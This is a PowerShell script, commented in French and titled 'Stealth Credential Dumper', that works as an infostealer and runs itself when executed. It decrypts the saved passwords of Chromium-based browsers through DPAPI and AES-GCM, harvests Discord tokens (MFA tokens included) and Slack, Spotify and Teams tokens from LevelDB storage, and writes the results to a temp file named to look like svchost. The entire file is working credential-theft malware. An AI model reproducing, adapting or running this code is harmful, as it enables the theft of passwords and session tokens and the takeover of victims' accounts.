<#
.SYNOPSIS
    Stealth Credential Dumper - Decrypte et extrait tout
#>

function Invoke-DeepHarvest {
    $Output = @()
    $Timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
    $LogFile = "$env:TEMP\svchost_$Timestamp.txt"

    Write-Host "[+] Deep Harvest en cours..." -ForegroundColor Cyan

    # ─── 1. DECRYPTAGE COMPLET CHROMIUM (DPAPI) ───
    Write-Host "[+] Decryptage des mots de passe Chrome/Edge..." -ForegroundColor Yellow
    
    # Load SQLite assembly
    try {
        Add-Type -AssemblyName "System.Data.SQLite" -ErrorAction SilentlyContinue
    } catch { }

    $ChromiumBrowsers = @{
        "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
        "Opera"   = "$env:LOCALAPPDATA\Opera Software\Opera Stable"
    }

    # Extraction AES key from Local State
    $AESKey = $null
    foreach ($browser in $ChromiumBrowsers.Keys) {
        $localState = $ChromiumBrowsers[$browser] + "\Local State"
        if (Test-Path $localState) {
            try {
                $json = Get-Content $localState -Raw | ConvertFrom-Json
                $encryptedKey = $json.os_crypt.encrypted_key
                if ($encryptedKey) {
                    $keyBytes = [Convert]::FromBase64String($encryptedKey)
                    $AESKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes[5..($keyBytes.Length-1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    Write-Host "[+] AES Key extraite avec succes" -ForegroundColor Green
                    break
                }
            } catch { }
        }
    }

    foreach ($browser in $ChromiumBrowsers.Keys) {
        $loginDbPath = $ChromiumBrowsers[$browser] + "\Default\Login Data"
        
        if (-not (Test-Path $loginDbPath)) { continue }
        
        try {
            $tmpDb = "$env:TEMP\ld_$([System.IO.Path]::GetRandomFileName())"
            Copy-Item $loginDbPath $tmpDb -Force -ErrorAction SilentlyContinue
            
            $connString = "Data Source=$tmpDb;Read Only=True;"
            $conn = New-Object System.Data.SQLite.SQLiteConnection($connString)
            $conn.Open()
            
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            
            $count = 0
            while ($reader.Read()) {
                $url = $reader["origin_url"]
                $username = $reader["username_value"]
                $encPass = $reader["password_value"]
                
                if (-not $url -or -not $encPass) { continue }
                
                $password = ""
                
                # Methode 1 : DPAPI direct
                try {
                    $password = [System.Text.Encoding]::UTF8.GetString(
                        [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    )
                } catch { }
                
                # Methode 2 : AES decryption (Chrome 80+)
                if (-not $password -and $AESKey -and $encPass.Length -gt 15) {
                    try {
                        $nonce = $encPass[3..14]
                        $ciphertext = $encPass[15..($encPass.Length-17)]
                        $tag = $encPass[($encPass.Length-16)..($encPass.Length-1)]
                        
                        $aes = [System.Security.Cryptography.AesGcm]::new($AESKey)
                        $plainBytes = [byte[]]::new($ciphertext.Length)
                        $aes.Decrypt($nonce, $ciphertext, $tag, $plainBytes)
                        $password = [System.Text.Encoding]::UTF8.GetString($plainBytes)
                    } catch { }
                }
                
                if ($password) {
                    $Output += "[$browser] $url | $username : $password"
                    $count++
                }
            }
            $reader.Close()
            $conn.Close()
            Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
            
            if ($count -gt 0) {
                Write-Host "[+] $count identifiants decryptes dans $browser" -ForegroundColor Green
            }
        } catch {
            Write-Warning "Erreur $browser : $_"
        }
    }

    # ─── 2. TOKENS DISCORD ───
    Write-Host "[+] Recherche agressive des tokens Discord..." -ForegroundColor Yellow
    
    $DiscordPaths = @(
        "$env:APPDATA\Roaming\Discord\Local Storage\leveldb",
        "$env:APPDATA\Roaming\discordptb\Local Storage\leveldb",
        "$env:APPDATA\Roaming\discordcanary\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Roaming\Discord\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Roaming\discordptb\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Roaming\discordcanary\Local Storage\leveldb"
    )
    
    $TokenPattern = '[a-zA-Z0-9_-]{22,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,38}'
    $TokenPattern2 = 'mfa\.[a-zA-Z0-9_-]{80,90}'
    
    $TokensFound = @{}
    
    foreach ($Path in $DiscordPaths) {
        $files = Get-ChildItem "$Path\*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try {
                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                if ($content) {
                    $matches = [regex]::Matches($content, $TokenPattern)
                    foreach ($m in $matches) {
                        if (-not $TokensFound.ContainsKey($m.Value)) {
                            $TokensFound[$m.Value] = $true
                            $Output += "[DISCORD TOKEN] $($m.Value)"
                        }
                    }
                    $matches2 = [regex]::Matches($content, $TokenPattern2)
                    foreach ($m in $matches2) {
                        if (-not $TokensFound.ContainsKey($m.Value)) {
                            $TokensFound[$m.Value] = $true
                            $Output += "[DISCORD TOKEN MFA] $($m.Value)"
                        }
                    }
                }
            } catch { }
        }
    }
    
    # ─── 3. TOKENS DEPUIS CHROME LOCAL STORAGE ───
    Write-Host "[+] Recherche des tokens depuis Chrome Local Storage..." -ForegroundColor Yellow
    $ChromeStoragePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
    )
    
    foreach ($Path in $ChromeStoragePaths) {
        $files = Get-ChildItem "$Path\*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try {
                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                if ($content) {
                    $matches = [regex]::Matches($content, $TokenPattern)
                    foreach ($m in $matches) {
                        if (-not $TokensFound.ContainsKey($m.Value)) {
                            $TokensFound[$m.Value] = $true
                            $Output += "[CHROME STORAGE TOKEN] $($m.Value)"
                        }
                    }
                }
            } catch { }
        }
    }

    # ─── 4. TOKENS GENERIQUES (Slack, GitHub, Spotify, etc.) ───
    Write-Host "[+] Recherche de tokens generiques..." -ForegroundColor Yellow
    $GenericPaths = @(
        "$env:APPDATA\Slack\Local Storage\leveldb",
        "$env:APPDATA\Spotify\Local Storage\leveldb",
        "$env:APPDATA\Microsoft\Teams\Local Storage\leveldb"
    )
    
    $GenericPattern = '(?:access_token|refresh_token|api_key|apikey|secret|bearer|token|auth)[=:][''""]?([a-zA-Z0-9_\-\.]{20,70})[''""]?'
    
    foreach ($Path in $GenericPaths) {
        $files = Get-ChildItem "$Path\*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try {
                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                if ($content) {
                    $matches = [regex]::Matches($content, $GenericPattern)
                    foreach ($m in $matches) {
                        $val = $m.Groups[1].Value
                        if ($val -and $val.Length -gt 15 -and -not $TokensFound.ContainsKey($val)) {
                            $TokensFound[$val] = $true
                            $Output += "[GENERIC TOKEN] $val"
                        }
                    }
                }
            } catch { }
        }
    }

    # ─── 5. ECRITURE ───
    Write-Host "[+] Ecriture du rapport..." -ForegroundColor Yellow
    $FinalOutput = $Output -join "`n`n"
    try {
        $FinalOutput | Out-File -FilePath $LogFile -Encoding UTF8 -Force
        Write-Host "[OK] Fichier : $LogFile" -ForegroundColor Green
        Write-Host "[OK] $($Output.Count) entrees collectees" -ForegroundColor Cyan
    } catch {
        $LogFile = "$env:USERPROFILE\Desktop\svchost_$Timestamp.txt"
        $FinalOutput | Out-File -FilePath $LogFile -Encoding UTF8 -Force
        Write-Host "[OK] Fallback bureau : $LogFile" -ForegroundColor Green
    }
}

Invoke-DeepHarvest
